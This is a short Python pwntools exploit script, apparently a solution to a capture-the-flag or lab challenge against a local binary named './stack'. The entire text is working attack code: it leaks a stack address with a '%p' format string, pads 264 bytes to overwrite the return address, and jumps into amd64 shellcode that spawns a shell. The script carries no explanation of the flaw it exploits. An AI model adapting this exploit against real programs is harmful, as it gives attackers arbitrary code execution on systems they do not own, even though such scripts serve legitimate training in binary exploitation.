from pwn import *
import struct
context.arch = ‘amd64’
io = process(‘./stack’)
raw_input(“attach GDB”)
(io.recvregex(‘:’)) # read until we get the prompt
info(“sending format string…”)
io.sendline(‘%p,%p,%p’)
io.recvline()
leak = io.recvline().split(‘,’)[1]
io.recvregex(‘:’) # read until we get the prompt
start_buf = (int(leak, 16))+264 -9 #This calculation is different
info(“leaked start of buffer: 0x{:08x}”.format(start_buf))
padding = “a” * 264
RIP = struct.pack(“Q”,start_buf + 8)
shellcode = asm(shellcraft.amd64.linux.sh())
payload = padding + RIP + shellcode 
info(‘sending exploit’)
io.sendline(payload)
io.interactive()